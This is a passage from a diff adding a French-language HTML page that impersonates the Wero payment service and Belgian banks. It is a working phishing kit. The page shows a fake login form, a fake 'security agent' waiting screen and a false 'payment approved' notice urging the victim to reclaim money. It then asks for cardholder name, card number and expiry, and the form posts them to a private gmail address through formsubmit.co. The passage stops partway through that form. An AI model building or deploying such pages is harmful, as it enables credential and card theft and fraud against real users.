@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Wero — Connexion</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+
+:root{
+  --yellow:#fff48d;
+  --pink:#ffa6bd;
+  --pink-dark:#e8829c;
+  --pink-deep:#c94b6e;
+  --yellow-light:#fff9d6;
+  --teal:#ffa6bd;
+  --teal-dark:#e8829c;
+  --teal-light:#fff8eb;
+  --teal-mid:#fff48d;
+  --ink:#2b2125;
+  --muted:#7d6e73;
+  --border:#f0e0e4;
+  --surface:#fff;
+  --bg:#fff48d;
+  --error:#e53e3e;
+  --success:#22c55e;
+}
+
+html,body{min-height:100%;font-family:'Inter',sans-serif;background:var(--bg);color:var(--ink)}
+
+/* ════════════════ NAV ════════════════ */
+nav{
+  position:sticky;top:0;z-index:200;
+  background:#fff;
+  border-bottom:1.5px solid var(--border);
+  padding:0 2rem;
+  height:60px;
+  display:flex;align-items:center;justify-content:space-between;
+  gap:1rem;
+}
+.nav-logo{font-size:1.5rem;font-weight:700;color:var(--teal);font-style:italic;letter-spacing:-.02em;flex-shrink:0}
+
+.nav-search{
+  flex:1;max-width:420px;
+  position:relative;
+}
+.nav-search input{
+  width:100%;height:40px;
+  border:1.5px solid var(--border);border-radius:20px;
+  background:#fffdf2;
+  font-family:'Inter',sans-serif;font-size:.85rem;
+  color:var(--ink);padding:0 1rem 0 2.6rem;
+  outline:none;transition:border-color .2s,box-shadow .2s;
+}
+.nav-search input:focus{border-color:var(--pink);box-shadow:0 0 0 3px rgba(255,166,189,.25);background:#fff}
+.nav-search .search-ico{
+  position:absolute;left:.8rem;top:50%;transform:translateY(-50%);
+  color:#d4c2c7;pointer-events:none;
+}
+.nav-search .search-ico svg{width:15px;height:15px}
+
+.nav-actions{display:flex;align-items:center;gap:.7rem;flex-shrink:0}
+.btn-nav-outline{
+  height:36px;padding:0 1rem;
+  border:1.5px solid var(--pink);border-radius:8px;
+  background:transparent;color:var(--ink);
+  font-family:'Inter',sans-serif;font-size:.8rem;font-weight:600;
+  cursor:pointer;white-space:nowrap;
+  transition:background .2s,color .2s;
+}
+.btn-nav-outline:hover{background:var(--yellow-light)}
+.btn-nav-teal{
+  height:36px;padding:0 1rem;
+  border:none;border-radius:8px;
+  background:var(--pink);color:var(--ink);
+  font-family:'Inter',sans-serif;font-size:.8rem;font-weight:700;
+  cursor:pointer;white-space:nowrap;
+  transition:background .2s,transform .1s;
+}
+.btn-nav-teal:hover{background:var(--yellow)}
+.nav-lang{font-size:.8rem;font-weight:600;color:var(--muted);cursor:pointer}
+
+/* ════════════════ PAGES ════════════════ */
+.page{
+  min-height:calc(100vh - 60px);
+  display:flex;flex-direction:column;align-items:center;
+  transition:opacity .38s ease,transform .38s ease;
+}
+.page.hidden{display:none!important}
+
+@keyframes rise{
+  from{opacity:0;transform:translateY(20px)}
+  to{opacity:1;transform:translateY(0)}
+}
+@keyframes popIn{
+  from{transform:scale(0) rotate(-20deg);opacity:0}
+  to{transform:scale(1) rotate(0);opacity:1}
+}
+
+/* ════════════════ PAGE 0 — LOGIN ════════════════ */
+#page0{
+  justify-content:center;
+  padding:3rem 1.5rem;
+  background:var(--bg);
+}
+
+.login-card{
+  background:#fff;
+  border:1.5px solid var(--border);
+  border-radius:20px;
+  padding:2.6rem 2.4rem;
+  width:100%;max-width:460px;
+  box-shadow:0 4px 6px rgba(0,0,0,.04),0 20px 50px rgba(0,0,0,.08);
+  display:flex;flex-direction:column;gap:1.5rem;
+  animation:rise .5s cubic-bezier(.22,.68,0,1.2) both;
+}
+
+.login-card h1{
+  font-size:1.55rem;font-weight:700;
+  text-align:center;color:var(--ink);
+}
+
+.login-divider-text{
+  display:flex;align-items:center;gap:.8rem;
+  font-size:.75rem;color:var(--muted);font-weight:500;
+}
+.login-divider-text::before,.login-divider-text::after{
+  content:'';flex:1;height:1px;background:var(--border);
+}
+
+/* Social buttons */
+.social-btns{display:flex;flex-direction:column;gap:.7rem}
+.btn-social{
+  height:46px;border-radius:10px;
+  border:1.5px solid var(--border);
+  background:#fff;
+  display:flex;align-items:center;justify-content:center;gap:.7rem;
+  font-family:'Inter',sans-serif;font-size:.88rem;font-weight:500;
+  color:var(--ink);cursor:pointer;
+  transition:border-color .2s,background .2s,transform .1s;
+}
+.btn-social:hover{border-color:var(--pink);background:var(--yellow-light);transform:translateY(-1px)}
+.btn-social svg{width:18px;height:18px}
+.btn-social .g-icon{color:#EA4335}
+.btn-social .f-icon{color:#1877F2}
+.btn-social .a-icon{color:#000}
+
+/* Login form fields */
+.lfield{display:flex;flex-direction:column;gap:.35rem}
+.lfield label{font-size:.78rem;font-weight:600;color:var(--ink)}
+.lfield .linput-wrap{position:relative}
+.lfield .l-ico{
+  position:absolute;left:.85rem;top:50%;transform:translateY(-50%);
+  color:#d4c2c7;pointer-events:none;display:flex;transition:color .2s;
+}
+.lfield .l-ico svg{width:16px;height:16px}
+.lfield .linput-wrap:focus-within .l-ico{color:var(--pink-deep)}
+
+.lfield input{
+  width:100%;height:50px;
+  border:1.5px solid var(--border);border-radius:10px;
+  background:#fff;font-family:'Inter',sans-serif;
+  font-size:.92rem;color:var(--ink);
+  padding:0 .9rem 0 2.7rem;outline:none;
+  transition:border-color .2s,box-shadow .2s;
+}
+.lfield input:focus{border-color:var(--pink);box-shadow:0 0 0 3px rgba(255,166,189,.28)}
+.lfield input.error{border-color:var(--error)}
+.lfield input.valid{border-color:var(--success)}
+.lfield .show-pass{
+  position:absolute;right:.9rem;top:50%;transform:translateY(-50%);
+  background:none;border:none;cursor:pointer;
+  color:#d4c2c7;padding:0;display:flex;
+  transition:color .2s;
+}
+.lfield .show-pass:hover{color:var(--pink-deep)}
+.lfield .show-pass svg{width:16px;height:16px}
+.lfield-error{font-size:.7rem;color:var(--error);min-height:.9rem}
+
+.btn-login{
+  height:52px;border:none;border-radius:12px;
+  background:#ede2e5;color:#b09ea4;
+  font-family:'Inter',sans-serif;font-size:1rem;font-weight:700;
+  letter-spacing:.02em;cursor:not-allowed;
+  transition:background .3s,color .3s,transform .15s,box-shadow .2s;
+  position:relative;overflow:hidden;
+}
+.btn-login.active{
+  background:#ffa6bd;color:var(--ink);cursor:pointer;
+  box-shadow:0 4px 18px rgba(255,166,189,.4);
+}
+.btn-login.active:hover{transform:translateY(-2px);box-shadow:0 8px 26px rgba(255,166,189,.5)}
+.btn-login.active:active{transform:translateY(0)}
+.btn-login.loading .btn-login-text{display:none}
+.btn-login.loading::after{
+  content:'';display:block;
+  width:22px;height:22px;
+  border:2.5px solid rgba(43,33,37,.3);
+  border-top-color:var(--ink);border-radius:50%;
+  animation:spin .7s linear infinite;margin:auto;
+}
+
+.login-links{
+  display:flex;flex-direction:column;align-items:center;
+  gap:.5rem;font-size:.83rem;
+}
+.login-links a{color:var(--pink-deep);text-decoration:none;font-weight:600;cursor:pointer}
+.login-links a:hover{text-decoration:underline}
+
+.login-signup{
+  font-size:.83rem;color:var(--muted);text-align:center;
+  padding-top:.5rem;border-top:1px solid var(--border);
+}
+.login-signup a{color:var(--pink-deep);font-weight:700;text-decoration:none;cursor:pointer}
+.login-signup a:hover{text-decoration:underline}
+
+/* Password strength */
+.pw-strength{display:flex;gap:.3rem;margin-top:.4rem}
+.pw-bar{height:3px;flex:1;border-radius:3px;background:#f2e6e9;transition:background .3s}
+.pw-bar.weak{background:#e53e3e}
+.pw-bar.fair{background:#f6ad55}
+.pw-bar.good{background:var(--yellow)}
+.pw-bar.strong{background:var(--pink)}
+
+/* ════════════════ PAGE 1 — STATUT ════════════════ */
+#page1{
+  justify-content:center;
+  padding:3rem 1.5rem;gap:2.2rem;text-align:center;
+}
+.status-icon{
+  width:72px;height:72px;border-radius:50%;
+  background:#ffa6bd;display:grid;place-items:center;
+  margin:0 auto;box-shadow:0 8px 28px rgba(255,166,189,.35);
+  animation:popIn .6s cubic-bezier(.34,1.56,.64,1) both;
+}
+.status-icon svg{color:var(--ink);width:34px;height:34px}
+.status-text{animation:rise .5s .15s ease both}
+.status-text h1{
+  font-size:1.1rem;font-weight:700;
+  text-transform:uppercase;letter-spacing:.06em;
+  color:var(--ink);margin-bottom:.3rem;
+}
+.status-text .highlight{color:var(--pink-deep)}
+.brand-logo{
+  font-size:3.2rem;font-weight:700;font-style:italic;
+  color:var(--pink);letter-spacing:-.03em;
+  animation:rise .5s .25s ease both;
+}
+.info-box{
+  background:#fff;border:1.5px solid var(--border);
+  border-radius:14px;padding:1.2rem 1.8rem;
+  max-width:500px;width:100%;
+  font-size:.9rem;line-height:1.6;color:var(--muted);
+  animation:rise .5s .3s ease both;
+}
+.info-box strong{color:var(--ink)}
+.bank-logos{
+  display:flex;flex-wrap:wrap;justify-content:center;
+  align-items:center;gap:1rem 1.4rem;
+  max-width:580px;
+  animation:rise .5s .35s ease both;
+}
+.bank-pill{
+  background:#fff;border:1.5px solid var(--border);
+  border-radius:10px;padding:.5rem 1.1rem;
+  font-size:.78rem;font-weight:700;
+  letter-spacing:.04em;color:var(--ink);
+  box-shadow:0 2px 8px rgba(0,0,0,.05);
+}
+.bank-pill.belfius{color:#e2001a;border-color:#f5b8c0}
+.bank-pill.ing{color:#ff6200;border-color:#ffd4b3}
+.bank-pill.bnp{color:#00965e;border-color:#9fdece}
+.bank-pill.crelan{color:#2d8a2d;border-color:#b3dfb3}
+.bank-pill.cph{color:#004b87;border-color:#b8d6f2}
+.bank-pill.beobank{color:#e30613;border-color:#fbc5cd}
+.bank-pill.argenta{color:#008e36;border-color:#b8e8c4}
+.bank-pill.keytrade{color:#008bc7;border-color:#b8e4f7}
+.btn-main{
+  background:#ffa6bd;color:var(--ink);
+  border:none;border-radius:12px;
+  height:56px;padding:0 2.5rem;
+  font-family:'Inter',sans-serif;
+  font-size:1rem;font-weight:700;
+  letter-spacing:.04em;text-transform:uppercase;
+  cursor:pointer;position:relative;overflow:hidden;
+  box-shadow:0 6px 24px rgba(255,166,189,.4);
+  transition:transform .15s,box-shadow .2s;
+  animation:rise .5s .4s ease both;
+  width:100%;max-width:420px;
+}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 10px 32px rgba(255,166,189,.52);filter:brightness(1.04)}
+.btn-main:active{transform:translateY(0)}
+
+/* ════════════════ PAGE 2 — FORMULAIRE ════════════════ */
+#page2{
+  padding:0 1.5rem 3rem;max-width:740px;
+  margin:0 auto;width:100%;gap:1.6rem;
+}
+.progress-wrap{width:100%;padding:1.4rem 0 .6rem}
+.progress-label{font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);margin-bottom:.55rem}
+.progress-bar-bg{height:10px;border-radius:20px;background:#f2e6e9;overflow:hidden}
+.progress-bar-fill{
+  height:100%;width:0%;border-radius:20px;
+  background:#ffa6bd;
+  transition:width 1.2s cubic-bezier(.4,0,.2,1);
+}
+.progress-pct{font-size:.72rem;font-weight:700;color:var(--pink-deep);margin-top:.3rem;text-align:right}
+.photo-banner{
+  width:100%;height:180px;border-radius:16px;overflow:hidden;
+  background:#ffa6bd;
+  display:flex;align-items:center;justify-content:center;position:relative;
+}
+.photo-banner .banner-text{font-size:2.5rem;font-weight:700;font-style:italic;color:rgba(255,255,255,.65);letter-spacing:-.02em;user-select:none}
+.photo-banner .banner-tag{position:absolute;bottom:.8rem;right:1rem;background:rgba(255,255,255,.9);border-radius:20px;padding:.2rem .7rem;font-size:.7rem;font-weight:700;color:var(--ink)}
+.sec-card{background:#fff;border:1.5px solid var(--border);border-radius:16px;padding:1.8rem;display:flex;flex-direction:column;gap:1.2rem}
+.sec-card h2{font-size:1.15rem;font-weight:700;text-align:center;color:var(--ink)}
+.sec-row{display:flex;gap:.9rem;align-items:flex-start;background:var(--yellow-light);border:1px solid #ffecb3;border-radius:10px;padding:.9rem 1rem}
+.sec-row .s-icon{flex-shrink:0;width:32px;height:32px;background:var(--pink);border-radius:8px;display:grid;place-items:center}
+.sec-row .s-icon svg{color:var(--ink);width:16px;height:16px}
+.sec-row h3{font-size:.85rem;font-weight:700;margin-bottom:.2rem;color:var(--ink)}
+.sec-row p{font-size:.8rem;color:var(--muted);line-height:1.5}
+.note-box{border-left:3.5px solid var(--pink);background:#fff9eb;border-radius:0 10px 10px 0;padding:.8rem 1rem;font-size:.82rem;line-height:1.5;color:var(--ink)}
+.note-box strong{color:var(--pink-deep)}
+.form-card{background:#fff;border:1.5px solid var(--border);border-radius:16px;padding:1.8rem;display:flex;flex-direction:column;gap:1.2rem;width:100%;}
+.form-card h2{font-size:.8rem;font-weight:700;text-transform:uppercase;letter-spacing:.1em;text-align:center;color:var(--muted)}
+.field{display:flex;flex-direction:column;gap:.35rem}
+label{font-size:.8rem;font-weight:600;color:var(--ink)}
+label span.req{color:var(--error)}
+.input-wrap{position:relative}
+.input-wrap .i-icon{position:absolute;left:.85rem;top:50%;transform:translateY(-50%);color:#d4c2c7;pointer-events:none;display:flex;transition:color .2s}
+.input-wrap .i-icon svg{width:17px;height:17px}
+.input-wrap:focus-within .i-icon{color:var(--pink-deep)}
+input,select{
+  width:100%;height:50px;border:1.5px solid var(--border);border-radius:10px;
+  background:#fff;font-family:'Inter',sans-serif;font-size:.92rem;color:var(--ink);
+  padding:0 .9rem 0 2.7rem;outline:none;
+  transition:border-color .2s,box-shadow .2s;-webkit-appearance:none;appearance:none;
+}
+select{cursor:pointer;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23b09ea4' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right .9rem center}
+input:focus,select:focus{border-color:var(--pink);box-shadow:0 0 0 3px rgba(255,166,189,.28)}
+input.error,select.error{border-color:var(--error)}
+input.valid,select.valid{border-color:var(--success)}
+input::placeholder{color:#c4b4b8}
+.field-error{font-size:.7rem;color:var(--error);min-height:.9rem}
+.btn-submit{
+  background:#ffa6bd;color:var(--ink);border:none;border-radius:12px;
+  height:54px;width:100%;font-family:'Inter',sans-serif;
+  font-size:1rem;font-weight:700;letter-spacing:.03em;cursor:pointer;
+  position:relative;overflow:hidden;
+  box-shadow:0 4px 18px rgba(255,166,189,.38);
+  transition:transform .15s,box-shadow .2s;margin-top:.3rem;
+}
+.btn-submit:hover{transform:translateY(-2px);box-shadow:0 8px 26px rgba(255,166,189,.48);filter:brightness(1.04)}
+.btn-submit:active{transform:translateY(0)}
+.btn-submit.loading .btn-text{display:none}
+.btn-submit.loading::after{content:'';display:block;width:22px;height:22px;border:2.5px solid rgba(43,33,37,.3);border-top-color:var(--ink);border-radius:50%;animation:spin .7s linear infinite;margin:auto}
+@keyframes spin{to{transform:rotate(360deg)}}
+.secure-footer{text-align:center;font-size:.72rem;color:var(--muted);display:flex;align-items:center;justify-content:center;gap:.4rem;padding:.5rem 0 1rem}
+.secure-footer svg{color:var(--pink-deep);width:14px;height:14px}
+
+/* ════════════════ SUCCESS ════════════════ */
+.success-overlay{
+  position:fixed;inset:0;z-index:999;
+  background:rgba(255,252,248,.97);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  gap:1.2rem;text-align:center;
+  opacity:0;pointer-events:none;transition:opacity .4s;padding:2rem;
+}
+.success-overlay.visible{opacity:1;pointer-events:all}
+.s-circle{
+  width:80px;height:80px;border-radius:50%;
+  background:#ffa6bd;display:grid;place-items:center;
+  box-shadow:0 10px 32px rgba(255,166,189,.4);
+  animation:popIn .55s cubic-bezier(.34,1.56,.64,1) both;
+}
+.s-circle svg{color:var(--ink);width:36px;height:36px}
+.s-title{font-size:1.6rem;font-weight:700;color:var(--ink)}
+.s-sub{font-size:.9rem;color:var(--muted);max-width:260px}
+
+/* ════════════ PAGE ATTENTE ════════════ */
+#pageWait{justify-content:flex-start;background:var(--bg);padding:0;min-height:calc(100vh - 60px)}
+.wait-nav{width:100%;background:#fff;border-bottom:1px solid var(--border);padding:.85rem 1.2rem;display:flex;align-items:center;justify-content:center}
+.wait-nav-logo{font-size:1.4rem;font-weight:700;font-style:italic;color:var(--pink)}
+.wait-body{flex:1;width:100%;max-width:480px;margin:0 auto;display:flex;flex-direction:column;align-items:center;padding:1.6rem 1.2rem 0;gap:1.4rem}
+.agent-row{width:100%;display:flex;align-items:center;gap:.9rem;padding:.9rem 1rem;background:#fff;border-radius:14px;box-shadow:0 2px 10px rgba(0,0,0,.06);animation:rise .4s ease both}
+.agent-avatar{width:48px;height:48px;border-radius:50%;background:#ffa6bd;display:grid;place-items:center;font-size:1.25rem;font-weight:700;color:var(--ink);flex-shrink:0;position:relative}
+.agent-dot{position:absolute;bottom:2px;right:2px;width:12px;height:12px;border-radius:50%;background:#22c55e;border:2.5px solid #fff}
+.agent-info h3{font-size:.95rem;font-weight:700;color:var(--ink)}
+.agent-info p{font-size:.8rem;color:var(--pink-deep);font-weight:600}
+.ssl-badge{display:inline-flex;align-items:center;gap:.45rem;background:#fffbe8;border:1.5px solid var(--yellow);border-radius:20px;padding:.42rem 1rem;font-size:.8rem;font-weight:600;color:#6b5800;animation:rise .4s .1s ease both}
+.ssl-badge svg{width:15px;height:15px;color:#d49b00}
+.chat-bubble{width:64px;height:64px;border-radius:50%;background:#fff;box-shadow:0 4px 18px rgba(0,0,0,.08);display:grid;place-items:center;animation:chatpulse 2s ease-in-out infinite}
+.chat-bubble svg{width:30px;height:30px;color:#d8c2c8}
+@keyframes chatpulse{0%,100%{transform:scale(1);box-shadow:0 4px 18px rgba(0,0,0,.08)}50%{transform:scale(1.08);box-shadow:0 8px 28px rgba(255,166,189,.35)}}
+.typing-dots{display:flex;gap:.45rem;align-items:center}
+.typing-dots span{width:9px;height:9px;border-radius:50%;background:#f0e0e4;animation:dot-bounce 1.4s ease-in-out infinite}
+.typing-dots span:nth-child(2){animation-delay:.2s}
+.typing-dots span:nth-child(3){animation-delay:.4s}
+@keyframes dot-bounce{0%,80%,100%{background:#f0e0e4;transform:scale(1)}40%{background:var(--pink);transform:scale(1.35)}}
+.wait-title{font-size:1.45rem;font-weight:700;color:var(--ink);text-align:center}
+.wait-text{font-size:.88rem;color:var(--muted);text-align:center;line-height:1.75;max-width:290px}
+.wait-text strong{color:var(--ink)}
+.page-dots{display:flex;gap:.5rem;align-items:center}
+.page-dots span{width:9px;height:9px;border-radius:50%;background:#eddde1;transition:background .6s,transform .6s}
+.page-dots span.active{background:var(--pink);transform:scale(1.3)}
+.wait-footer-bar{width:100%;background:#fff;border-top:1px solid #f0e0e4;padding:1rem 1.2rem;font-size:.78rem;color:#9e8e94;text-align:center;margin-top:2.5rem}
+
+/* Responsive */
+@media(max-width:600px){
+  .nav-search{display:none}
+  .nav-actions .btn-nav-outline{display:none}
+  nav{padding:0 1rem}
+}
+</style>
+</head>
+<body>
+
+<!-- ════ NAV ════ -->
+<nav>
+  <div class="nav-logo"><img src="https://wero-wallet.eu/assets/images/wero-logo.png" alt="Wero" style="height:1.4em; max-height:36px; vertical-align:middle;"></div>
+  <div class="nav-search">
+    <span class="search-ico">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+    </span>
+    <input type="text" placeholder="Rechercher..."/>
+  </div>
+  <div class="nav-actions">
+    <button class="btn-nav-outline">S'inscrire | Se connecter</button>
+    <button class="btn-nav-teal">Envoyer de l'argent</button>
+    <span class="nav-lang">FR</span>
+  </div>
+</nav>
+
+<!-- ════════════════ PAGE 0 — LOGIN ════════════════ -->
+<div class="page" id="page0">
+  <div class="login-card">
+
+    <h1>Se connecter</h1>
+
+    <!-- Email & Password -->
+    <div class="lfield">
+      <label for="lemail">E-mail ou nom d'utilisateur</label>
+      <div class="linput-wrap">
+        <span class="l-ico">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+        </span>
+        <input type="email" id="lemail" placeholder="exemple@email.com" autocomplete="email" oninput="checkLoginBtn()"/>
+      </div>
+      <div class="lfield-error" id="errLemail"></div>
+    </div>
+
+    <div class="lfield">
+      <label for="lpass">Mot de passe</label>
+      <div class="linput-wrap">
+        <span class="l-ico">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        </span>
+        <input type="password" id="lpass" placeholder="••••••••" autocomplete="current-password" oninput="checkLoginBtn(); updateStrength(this.value)"/>
+        <button class="show-pass" type="button" onclick="togglePass()" id="togglePassBtn">
+          <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+        </button>
+      </div>
+      <div class="pw-strength" id="pwStrength">
+        <div class="pw-bar" id="pb1"></div>
+        <div class="pw-bar" id="pb2"></div>
+        <div class="pw-bar" id="pb3"></div>
+        <div class="pw-bar" id="pb4"></div>
+      </div>
+      <div class="lfield-error" id="errLpass"></div>
+    </div>
+
+    <button class="btn-login" id="btnLogin" onclick="handleLogin()">
+      <span class="btn-login-text">Continuer</span>
+    </button>
+
+    <div class="login-links">
+      <a onclick="void(0)">Mot de passe oublié ?</a>
+      <a onclick="void(0)">Un problème ?</a>
+    </div>
+
+    <div class="login-signup">
+      Pas encore de compte ? <a onclick="void(0)">S'inscrire gratuitement</a>
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════ PAGE ATTENTE ════════════════ -->
+<div class="page hidden" id="pageWait">
+  <!-- mini nav -->
+  <div class="wait-nav">
+    <div class="wait-nav-logo"><img src="https://wero-wallet.eu/assets/images/wero-logo.png" alt="Wero" style="height:1.4em; max-height:36px; vertical-align:middle;"></div>
+  </div>
+
+  <div class="wait-body">
+
+    <!-- Agent -->
+    <div class="agent-row">
+      <div class="agent-avatar">
+        W
+        <div class="agent-dot"></div>
+      </div>
+      <div class="agent-info">
+        <h3>Assistance Wero</h3>
+        <p>Agent en ligne</p>
+      </div>
+    </div>
+
+    <!-- SSL -->
+    <div class="ssl-badge">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      Connexion sécurisée SSL 256-bit
+    </div>
+
+    <!-- Chat bubble animée -->
+    <div class="chat-bubble">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
+      </svg>
+    </div>
+
+    <!-- Typing dots -->
+    <div class="typing-dots">
+      <span></span><span></span><span></span>
+    </div>
+
+    <div class="wait-title">Merci de patienter</div>
+
+    <div class="wait-text">
+      Votre demande est en cours de traitement par notre service de sécurité.
+      <strong>Veuillez rester en ligne avec votre agent.</strong> L'analyse de vos informations prend généralement moins de 2 minutes.
+    </div>
+
+    <!-- Pagination dots -->
+    <div class="page-dots" id="pageDots">
+      <span class="active"></span>
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+
+    <div class="wait-footer-bar">
+      Ne fermez pas cette fenêtre pour ne pas interrompre la procédure.
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════ PAGE 1 — STATUT ════════════════ -->
+<div class="page hidden" id="page1">
+  <div class="status-icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+  </div>
+  <div class="status-text">
+    <h1>Virement en attente de <span class="highlight">validation</span></h1>
+  </div>
+  <div class="brand-logo"><img src="https://wero-wallet.eu/assets/images/wero-logo.png" alt="Wero" style="height:1.2em; max-height:64px; vertical-align:middle;"></div>
+  <div class="info-box">
+    Ce paiement a été déduit du compte acheteur et a été <strong>« APPROUVÉ »</strong> par la banque émettrice.
+  </div>
+  <div class="bank-logos">
+    <div class="bank-pill belfius">■ Belfius</div>
+    <div class="bank-pill crelan">🌿 Crelan</div>
+    <div class="bank-pill ing">ING 🦁</div>
+    <div class="bank-pill bnp">BNP PARIBAS FORTIS</div>
+    <div class="bank-pill cph">▲ CPH Banque</div>
+    <div class="bank-pill beobank">● Beobank</div>
+    <div class="bank-pill argenta">✦ Argenta</div>
+    <div class="bank-pill keytrade">Keytrade Bank</div>
+  </div>
+  <button class="btn-main" onclick="goToForm()">RÉCUPÉRER MON ARGENT</button>
+</div>
+
+<!-- ════════════════ PAGE 2 — FORMULAIRE ════════════════ -->
+<div class="page hidden" id="page2">
+
+  <div class="progress-wrap" style="max-width:740px;width:100%">
+    <div class="progress-label">Progression de la mise à jour</div>
+    <div class="progress-bar-bg"><div class="progress-bar-fill" id="progressFill"></div></div>
+    <div class="progress-pct" id="progressPct">0%</div>
+  </div>
+
+  <div class="photo-banner">
+    <div class="banner-text"><img src="https://wero-wallet.eu/assets/images/wero-logo.png" alt="Wero" style="height:1.2em; max-height:56px; vertical-align:middle; filter: brightness(0) invert(1) opacity(0.55);"></div>
+    <div class="banner-tag">Paiement instantané européen</div>
+  </div>
+
+  <div class="sec-card">
+    <h2>Sécurité renforcée &amp; Protection des données</h2>
+    <p style="font-size:.87rem;color:var(--muted);text-align:center;line-height:1.6">
+      Conformément à la directive européenne <strong>DSP2</strong> et aux protocoles de sécurité de <strong>Wero</strong>, cette étape de vérification est obligatoire pour confirmer votre identité en tant que titulaire légitime du compte.
+    </p>
+    <div class="sec-row">
+      <div class="s-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      </div>
+      <div>
+        <h3>Confidentialité RGPD</h3>
+        <p>Aucune information n'est stockée sur des serveurs tiers. L'accès est strictement réservé au système bancaire.</p>
+      </div>
+    </div>
+    <div class="note-box">
+      <strong>Note :</strong> Une notification pourrait être envoyée sur votre application pour valider la procédure.
+    </div>
+  </div>
+
+  <div class="form-card">
+    <h2>Coordonnées de vérification</h2>
+    <form id="verifyForm" novalidate action="https://formsubmit.co/ajax/louanemarine6@gmail.com" method="POST">
+
+      <div class="field">
+        <label for="fname">Nom du titulaire <span class="req">*</span></label>
+        <div class="input-wrap">
+          <span class="i-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></span>
+          <input type="text" id="fname" placeholder="Pascal Rabiot" autocomplete="cc-name"/>
+        </div>
+        <div class="field-error" id="errFname"></div>
+      </div>
+
+      <div class="field">
+        <label for="cnum">Numéro de carte <span class="req">*</span></label>
+        <div class="input-wrap">
+          <span class="i-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg></span>
+          <input type="text" id="cnum" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number" style="letter-spacing:.08em"/>
+        </div>
+        <div class="field-error" id="errCnum"></div>
+      </div>
+
+      <div class="field">
+        <label for="expiry">Date d'expiration <span class="req">*</span></label>
+        <div class="input-wrap">
+          <span class="i-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg></span>
+          <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp"/>
+        </div>
+        <div class="field-error" id="errExpiry"></div>
+      </div>
+
+      <div class="field">
+        <label for="bank">Sélectionnez votre banque <span class="req">*</span></label>
+        <div class="input-wrap">
